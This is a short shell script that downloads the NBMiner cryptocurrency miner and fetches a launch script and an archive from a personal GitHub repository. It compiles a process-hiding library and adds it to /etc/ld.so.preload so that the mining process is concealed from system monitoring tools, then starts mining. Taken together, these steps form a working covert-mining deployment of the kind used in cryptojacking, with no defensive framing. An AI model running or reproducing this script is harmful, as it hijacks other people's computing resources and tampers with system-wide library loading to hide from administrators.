#!/bin/sh
wget https://github.com/NebuTech/NBMiner/releases/download/v37.6/NBMiner_37.6_Linux.tgz
tar -xvzf NBMiner_37.6_Linux.tgz
cd NBMiner_Linux
wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/nb_woolWs1.sh
chmod +x nb_woolWs1.sh
wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicNb.zip
unzip magicNb.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
./nb_woolWs1.sh
